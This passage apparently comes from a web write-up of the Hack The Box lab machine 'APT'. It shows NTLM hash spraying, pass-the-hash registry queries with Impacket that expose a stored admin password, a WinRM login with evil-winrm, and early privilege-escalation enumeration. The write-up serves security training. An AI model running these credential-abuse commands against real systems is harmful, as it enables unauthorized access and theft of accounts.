+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>python3<span class="w"> </span>spray_henry.py<span class="w"> </span>hashes_ntlm.txt
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Probando<span class="w"> </span><span class="m">1999</span><span class="w"> </span>hashes<span class="w"> </span>contra<span class="w"> </span>henry.vinson...
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>¡ÉXITO!<span class="w"> </span>Hash<span class="w"> </span>válido<span class="w"> </span>encontrado:<span class="w"> </span>&lt;REDACTED_HASH&gt;
+</code></pre></div>
+<p>Henry is reusing the NTLM hash of another user from the old dump. We now have valid credentials for him.</p>
+<hr />
+<h2 id="remote-registry-access-with-regpy">Remote Registry Access with reg.py<a class="headerlink" href="#remote-registry-access-with-regpy" title="Permanent link">&para;</a></h2>
+<p>Henry's hash authenticates against Kerberos, but SMB and WinRM both return Access Denied, he doesn't have interactive login rights. However, there's another avenue: <strong>Remote Registry via RPC</strong>.</p>
+<p>Windows administrators often forget to restrict Remote Registry access in GPOs, leaving it open as a way to read persistent configuration. If Henry has ever logged into this machine, his registry hive will be mounted under <code>HKU</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>reg.py<span class="w"> </span>-hashes<span class="w"> </span>:&lt;REDACTED_HASH&gt;<span class="w"> </span>htb.local/henry.vinson@apt6.htb<span class="w"> </span>query<span class="w"> </span>-keyName<span class="w"> </span><span class="s2">"HKU"</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>Impacket<span class="w"> </span>v0.13.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Cannot<span class="w"> </span>check<span class="w"> </span>RemoteRegistry<span class="w"> </span>status.<span class="w"> </span>Triggering<span class="w"> </span>start<span class="w"> </span>trough<span class="w"> </span>named<span class="w"> </span>pipe...
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>HKU
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>HKU<span class="se">\.</span>DEFAULT
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>HKU<span class="se">\S</span>-1-5-19
+<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>HKU<span class="se">\S</span>-1-5-20
+<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>HKU<span class="se">\S</span>-1-5-21-2993095098-2100462451-206186470-1105
+<a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>HKU<span class="se">\S</span>-1-5-21-2993095098-2100462451-206186470-1105_Classes
+<a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>HKU<span class="se">\S</span>-1-5-18
+</code></pre></div>
+<p>Henry's hive is mounted (<code>S-1-5-21-...-1105</code>). We enumerate the Software keys and find something unusual:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>reg.py<span class="w"> </span>-hashes<span class="w"> </span>:&lt;REDACTED_HASH&gt;<span class="w"> </span>htb.local/henry.vinson@apt6.htb<span class="w"> </span>query<span class="w"> </span>-keyName<span class="w"> </span><span class="s2">"HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software"</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Impacket<span class="w"> </span>v0.13.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Cannot<span class="w"> </span>check<span class="w"> </span>RemoteRegistry<span class="w"> </span>status.<span class="w"> </span>Triggering<span class="w"> </span>start<span class="w"> </span>trough<span class="w"> </span>named<span class="w"> </span>pipe...
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>HKU<span class="se">\S</span>-1-5-21-2993095098-2100462451-206186470-1105<span class="se">\S</span>oftware
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>HKU<span class="se">\S</span>-1-5-21-2993095098-2100462451-206186470-1105<span class="se">\S</span>oftware<span class="se">\G</span>iganticHostingManagementSystem<span class="w">   </span>←<span class="w"> </span>interesting!
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>HKU<span class="se">\S</span>-1-5-21-2993095098-2100462451-206186470-1105<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>HKU<span class="se">\S</span>-1-5-21-2993095098-2100462451-206186470-1105<span class="se">\S</span>oftware<span class="se">\P</span>olicies
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>HKU<span class="se">\S</span>-1-5-21-2993095098-2100462451-206186470-1105<span class="se">\S</span>oftware<span class="se">\R</span>egisteredApplications
+<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>HKU<span class="se">\S</span>-1-5-21-2993095098-2100462451-206186470-1105<span class="se">\S</span>oftware<span class="se">\S</span>ysinternals
+<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>HKU<span class="se">\S</span>-1-5-21-2993095098-2100462451-206186470-1105<span class="se">\S</span>oftware<span class="se">\V</span>Mware,<span class="w"> </span>Inc.
+<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>HKU<span class="se">\S</span>-1-5-21-2993095098-2100462451-206186470-1105<span class="se">\S</span>oftware<span class="se">\W</span>ow6432Node
+<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>HKU<span class="se">\S</span>-1-5-21-2993095098-2100462451-206186470-1105<span class="se">\S</span>oftware<span class="se">\C</span>lasses
+</code></pre></div>
+<p>We found a custom application key. Let's read it:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>reg.py<span class="w"> </span>-hashes<span class="w"> </span>:&lt;REDACTED_HASH&gt;<span class="w"> </span>htb.local/henry.vinson@apt6.htb<span class="w"> </span>query<span class="w"> </span>-keyName<span class="w"> </span><span class="s2">"HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\GiganticHostingManagementSystem"</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>Impacket<span class="w"> </span>v0.13.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Cannot<span class="w"> </span>check<span class="w"> </span>RemoteRegistry<span class="w"> </span>status.<span class="w"> </span>Triggering<span class="w"> </span>start<span class="w"> </span>trough<span class="w"> </span>named<span class="w"> </span>pipe...
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>HKU<span class="se">\S</span>-1-5-21-2993095098-2100462451-206186470-1105<span class="se">\S</span>oftware<span class="se">\G</span>iganticHostingManagementSystem
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="w">    </span>UserName<span class="w">    </span>REG_SZ<span class="w">   </span>henry.vinson_adm
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="w">    </span>PassWord<span class="w">    </span>REG_SZ<span class="w">   </span>&lt;REDACTED&gt;
+</code></pre></div>
+<p>The application stored credentials in plaintext in the registry. We have <code>henry.vinson_adm</code>'s password.</p>
+<blockquote>
+<p><strong>Pentest tip:</strong> Whenever you have credentials but no shell, look for persistence and configuration storage: SMB shares, LDAP, and the Windows Registry. Third-party management software like this routinely stores credentials in <code>HKCU\Software\&lt;AppName&gt;</code>.</p>
+</blockquote>
+<hr />
+<h2 id="shell-as-henryvinson_adm-and-user-flag">Shell as henry.vinson_adm and user Flag<a class="headerlink" href="#shell-as-henryvinson_adm-and-user-flag" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span>apt6.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'henry.vinson_adm'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;REDACTED&gt;'</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>WINRM<span class="w">       </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">5985</span><span class="w">   </span>APT<span class="w">              </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Build<span class="w"> </span><span class="m">14393</span><span class="w"> </span><span class="o">(</span>name:APT<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:htb.local<span class="o">)</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>WINRM<span class="w">       </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">5985</span><span class="w">   </span>APT<span class="w">              </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>htb.local<span class="se">\h</span>enry.vinson_adm:&lt;REDACTED&gt;<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>apt6.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'henry.vinson_adm'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;REDACTED&gt;'</span>
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>
+<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>
+<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt;<span class="w"> </span><span class="nb">type</span><span class="w"> </span>..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>&lt;USER_FLAG&gt;
+</code></pre></div>
+<hr />
+<h2 id="privilege-escalation-ntlmv1-downgrade-attack">Privilege Escalation — NTLMv1 Downgrade Attack<a class="headerlink" href="#privilege-escalation-ntlmv1-downgrade-attack" title="Permanent link">&para;</a></h2>
+<h3 id="finding-the-attack-path-via-powershell-history">Finding the Attack Path via PowerShell History<a class="headerlink" href="#finding-the-attack-path-via-powershell-history" title="Permanent link">&para;</a></h3>
+<p>Once I gained a shell as henry.vinson_adm, I started with basic enumeration to understand my environment.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="n">USER</span> <span class="n">INFORMATION</span>
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="p">----------------</span>
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>
+<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="n">User</span> <span class="n">Name</span>            <span class="n">SID</span>
+<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="p">====================</span> <span class="p">=============================================</span>
+<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="n">htb</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2993095098</span><span class="p">-</span><span class="n">2100462451</span><span class="p">-</span><span class="n">206186470</span><span class="p">-</span><span class="n">1106</span>
+<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>
+<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>
+<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="nb">GROUP </span><span class="n">INFORMATION</span>
+<a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="p">-----------------</span>
+<a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>
+<a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="nb">Group </span><span class="n">Name</span>                                 <span class="nb">Type </span>            <span class="n">SID</span>          <span class="n">Attributes</span>
+<a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a><span class="p">==========================================</span> <span class="p">================</span> <span class="p">============</span> <span class="p">==================================================</span>
+<a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a><span class="n">Everyone</span>                                   <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">0</span>      <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+<a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Remote</span> <span class="n">Management</span> <span class="n">Users</span>            <span class="k">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">580</span> <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+<a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span>                              <span class="k">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">545</span> <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+<a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Pre-Windows</span> <span class="n">2000</span> <span class="n">Compatible</span> <span class="n">Access</span> <span class="k">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">554</span> <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+<a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NETWORK</span>                       <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">2</span>      <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+<a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>           <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">11</span>     <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+<a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">This</span> <span class="n">Organization</span>             <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">15</span>     <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+<a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NTLM</span> <span class="n">Authentication</span>           <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">64</span><span class="p">-</span><span class="n">10</span>  <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+<a id="__codelineno-21-24" name="__codelineno-21-24" href="#__codelineno-21-24"></a><span class="k">Mandatory</span> <span class="n">Label</span><span class="p">\</span><span class="n">Medium</span> <span class="k">Mandatory</span> <span class="n">Level</span>     <span class="n">Label</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">16</span><span class="p">-</span><span class="n">8192</span>
+<a id="__codelineno-21-25" name="__codelineno-21-25" href="#__codelineno-21-25"></a>
+<a id="__codelineno-21-26" name="__codelineno-21-26" href="#__codelineno-21-26"></a>
+<a id="__codelineno-21-27" name="__codelineno-21-27" href="#__codelineno-21-27"></a><span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
+<a id="__codelineno-21-28" name="__codelineno-21-28" href="#__codelineno-21-28"></a><span class="p">----------------------</span>
+<a id="__codelineno-21-29" name="__codelineno-21-29" href="#__codelineno-21-29"></a>
+<a id="__codelineno-21-30" name="__codelineno-21-30" href="#__codelineno-21-30"></a><span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                    <span class="n">State</span>
+<a id="__codelineno-21-31" name="__codelineno-21-31" href="#__codelineno-21-31"></a><span class="p">=============================</span> <span class="p">==============================</span> <span class="p">=======</span>
+<a id="__codelineno-21-32" name="__codelineno-21-32" href="#__codelineno-21-32"></a><span class="n">SeMachineAccountPrivilege</span>     <span class="n">Add</span> <span class="n">workstations</span> <span class="n">to</span> <span class="n">domain</span>     <span class="n">Enabled</span>
+<a id="__codelineno-21-33" name="__codelineno-21-33" href="#__codelineno-21-33"></a><span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>       <span class="n">Enabled</span>
+<a id="__codelineno-21-34" name="__codelineno-21-34" href="#__codelineno-21-34"></a><span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="k">process</span> <span class="n">working</span> <span class="nb">set </span><span class="n">Enabled</span>
+<a id="__codelineno-21-35" name="__codelineno-21-35" href="#__codelineno-21-35"></a>
+<a id="__codelineno-21-36" name="__codelineno-21-36" href="#__codelineno-21-36"></a>
+<a id="__codelineno-21-37" name="__codelineno-21-37" href="#__codelineno-21-37"></a><span class="n">USER</span> <span class="n">CLAIMS</span> <span class="n">INFORMATION</span>
+<a id="__codelineno-21-38" name="__codelineno-21-38" href="#__codelineno-21-38"></a><span class="p">-----------------------</span>
+<a id="__codelineno-21-39" name="__codelineno-21-39" href="#__codelineno-21-39"></a>
+<a id="__codelineno-21-40" name="__codelineno-21-40" href="#__codelineno-21-40"></a><span class="n">User</span> <span class="n">claims</span> <span class="n">unknown</span><span class="p">.</span>
+<a id="__codelineno-21-41" name="__codelineno-21-41" href="#__codelineno-21-41"></a>
+<a id="__codelineno-21-42" name="__codelineno-21-42" href="#__codelineno-21-42"></a><span class="n">Kerberos</span> <span class="n">support</span> <span class="k">for</span> <span class="n">Dynamic</span> <span class="n">Access</span> <span class="n">Control</span> <span class="n">on</span> <span class="n">this</span> <span class="n">device</span> <span class="n">has</span> <span class="n">been</span> <span class="n">disabled</span><span class="p">.</span>
+<a id="__codelineno-21-43" name="__codelineno-21-43" href="#__codelineno-21-43"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">net</span> <span class="n">users</span>
+<a id="__codelineno-21-44" name="__codelineno-21-44" href="#__codelineno-21-44"></a>
+<a id="__codelineno-21-45" name="__codelineno-21-45" href="#__codelineno-21-45"></a><span class="n">User</span> <span class="n">accounts</span> <span class="k">for</span> <span class="p">\\</span>
+<a id="__codelineno-21-46" name="__codelineno-21-46" href="#__codelineno-21-46"></a>
+<a id="__codelineno-21-47" name="__codelineno-21-47" href="#__codelineno-21-47"></a><span class="p">-------------------------------------------------------------------------------</span>
+<a id="__codelineno-21-48" name="__codelineno-21-48" href="#__codelineno-21-48"></a><span class="n">Administrator</span>            <span class="n">DefaultAccount</span>           <span class="n">Guest</span>
+<a id="__codelineno-21-49" name="__codelineno-21-49" href="#__codelineno-21-49"></a><span class="n">henry</span><span class="p">.</span><span class="n">vinson</span>             <span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span>         <span class="n">krbtgt</span>
+</code></pre></div>
+Before jumping into automated tools like BloodHound, I perform a manual "visual dump" of the user's file structure. Often, administrators leave sensitive information or configuration traces in non standard locations.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">&gt;</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="nb">dir </span><span class="p">/</span><span class="n">S</span> <span class="p">/</span><span class="n">A</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a> <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">is</span> <span class="n">System</span>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="n">BF99-DE3E</span>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a> <span class="n">Directory</span> <span class="n">of</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span>
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="n">09</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2020</span>  <span class="n">08</span><span class="p">:</span><span class="n">40</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">.</span>
+<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="n">09</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2020</span>  <span class="n">08</span><span class="p">:</span><span class="n">40</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">..</span>
+<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a><span class="n">09</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2020</span>  <span class="n">08</span><span class="p">:</span><span class="n">40</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">AppData</span>
+<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="n">09</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2020</span>  <span class="n">08</span><span class="p">:</span><span class="n">40</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">JUNCTION</span><span class="p">&gt;</span>     <span class="n">Application</span> <span class="n">Data</span> <span class="p">[</span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">]</span>
+<a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="n">09</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2020</span>  <span class="n">09</span><span class="p">:</span><span class="n">17</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Contacts</span>
+<a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a><span class="n">09</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2020</span>  <span class="n">08</span><span class="p">:</span><span class="n">40</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">JUNCTION</span><span class="p">&gt;</span>     <span class="n">Cookies</span> <span class="p">[</span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">INetCookies</span><span class="p">]</span>
+<a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a><span class="n">10</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2020</span>  <span class="n">11</span><span class="p">:</span><span class="n">02</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Desktop</span>
+<a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a><span class="n">10</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2020</span>  <span class="n">10</span><span class="p">:</span><span class="n">39</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Documents</span>
+<a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a><span class="n">09</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2020</span>  <span class="n">09</span><span class="p">:</span><span class="n">17</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Downloads</span>
+<a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a><span class="n">09</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2020</span>  <span class="n">09</span><span class="p">:</span><span class="n">17</span> <span class="n">AM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">Favorites</span>
